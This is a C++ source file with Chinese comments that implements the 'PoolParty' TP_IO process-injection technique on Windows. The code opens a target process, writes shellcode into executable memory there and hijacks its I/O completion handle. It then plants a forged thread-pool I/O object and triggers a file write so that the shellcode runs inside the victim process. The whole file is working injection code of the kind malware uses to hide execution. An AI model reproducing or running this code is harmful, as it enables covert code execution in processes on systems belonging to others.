//TPIO.cpp
#include<Windows.h>
#include "TPIO.h"
#include "HijackHandle.h"
#include <winternl.h>
#include <iostream>
#include <string>
#pragma(lib, "ntdll.lib")
#define POOL_PARTY_POEM "I'll handle u" 
                      
                      
                        
// 在文件顶部添加（在#include <winternl.h>之后，或在合适位置）
typedef NTSTATUS(NTAPI* PFN_NtSetInformationFile)(
    HANDLE,
    PIO_STATUS_BLOCK,
    PVOID,
    ULONG,
    ULONG // 注意：最后一个参数应为 ULONG 类型，而不是 FILE_INFORMATION_CLASS
    );

// ... 省略其他代码 ...

NTSTATUS MySetInformationFile(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass // 这里也改为 ULONG
)
{
    PFN_NtSetInformationFile NtSetInformationFile =
        (PFN_NtSetInformationFile)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtSetInformationFile"
        );
    if (!NtSetInformationFile)
    {
        printf("获取NtSetInformationFile失败\n");
        return STATUS_UNSUCCESSFUL;
    }
    NTSTATUS status = NtSetInformationFile(
        FileHandle,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass
    );
    if (!NT_SUCCESS(status))
    {
        printf("设置文件信息失败: 0x%08X\n", status);
        return status;
    }
    printf("设置文件信息成功\n");
    return STATUS_SUCCESS;
}
LPVOID w_VirtualAllocEx(HANDLE hTargetPid, SIZE_T szSizeOfChunk, DWORD dwAllocationType, DWORD dwProtect)
{
    const auto AllocatedMemory = VirtualAllocEx(hTargetPid, nullptr, szSizeOfChunk, dwAllocationType, dwProtect);
    if (AllocatedMemory == NULL)
    {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
    }
    return AllocatedMemory;
}
PFULL_TP_IO w_CreateThreadpoolIo(HANDLE hFile, PTP_WIN32_IO_CALLBACK pCallback, PVOID pContext, PTP_CALLBACK_ENVIRON pCallbackEnviron) {
    const auto pTpIo = (PFULL_TP_IO)CreateThreadpoolIo(hFile, pCallback, pContext, pCallbackEnviron);
    if (NULL == pTpIo) {
        printf("[-] CreateThreadpoolIo failed: %d\n", GetLastError());
    }
    return pTpIo;
}
// 在文件顶部添加（如果 FILE_COMPLETION_INFORMATION 未定义）
typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, * PFILE_COMPLETION_INFORMATION;

// 在文件顶部添加（如果 FileReplaceCompletionInformation 未定义）
#define FileReplaceCompletionInformation 61

BOOL TP_IO_Inject(DWORD dwTargetPid, unsigned char* g_shellcode, SIZE_T g_shellcodeSize)
{
    NTSTATUS status;

    printf("[+] Starting TP_IO Injection against PID: %d\n", dwTargetPid);

    // 1. 打开目标进程
    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPid);
    if (!hTarget)
    {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("打开成功，目标进程句柄: %p\n", hTarget);
    LPVOID ShellcodeAddress =
        w_VirtualAllocEx(
            hTarget,
            g_shellcodeSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    if (!ShellcodeAddress)
    {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
    }
    BOOL ok = WriteProcessMemory(
        hTarget,
        ShellcodeAddress,
        g_shellcode,
        g_shellcodeSize,
        NULL
    );
    if (!ok)
    {
        printf("WriteProcessMemory failed: %d\n", GetLastError());
    }
    // 2. 劫持目标进程的 IoCompletion 句柄
    HANDLE hIoCompletion = Hijack_TP_IO_HANDLE(&hTarget, dwTargetPid);  // 使用你原来的劫持函数
    if (!hIoCompletion)
    {
        printf("[-] Hijack IoCompletion failed\n");
        CloseHandle(hTarget);
        return FALSE;
    }
    printf("[+] Hijacked IoCompletion Handle: %p\n", hIoCompletion);
    const auto p_hFile = CreateFile(
        L"PoolParty.txt",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        nullptr);
    const auto pTpIo = w_CreateThreadpoolIo(p_hFile, (PTP_WIN32_IO_CALLBACK)ShellcodeAddress, nullptr, nullptr);
    if (pTpIo == NULL)
    {
        printf("CreateThreadpoolIo failed: %d\n", GetLastError());
    }
    pTpIo->CleanupGroupMember.Callback = ShellcodeAddress;
    ++pTpIo->PendingIrpCount;
    const auto pRemoteTpIo = (PFULL_TP_IO)(w_VirtualAllocEx(hTarget, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!pRemoteTpIo)
    {
        printf("VirtualAllocEx for TP_IO failed: %d\n", GetLastError());
    }
    BOOL ok2 = WriteProcessMemory(hTarget, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), NULL);
    if (!ok2)
    {
        printf("WriteProcessMemory for TP_IO failed: %d\n", GetLastError());
    }
    IO_STATUS_BLOCK IoStatusBlock{ 0 };
    FILE_COMPLETION_INFORMATION FileIoCopmletionInformation{ 0 };
    FileIoCopmletionInformation.Port = hIoCompletion;
    FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;
    MySetInformationFile(p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
    const std::string Buffer = POOL_PARTY_POEM;
    const auto BufferLength = Buffer.length();
    OVERLAPPED Overlapped{ 0 };
    BOOL isok3 = WriteFile(p_hFile, Buffer.c_str(), BufferLength, nullptr, &Overlapped);
    printf("[+] WriteFile issued, waiting for shellcode execution...\n");
}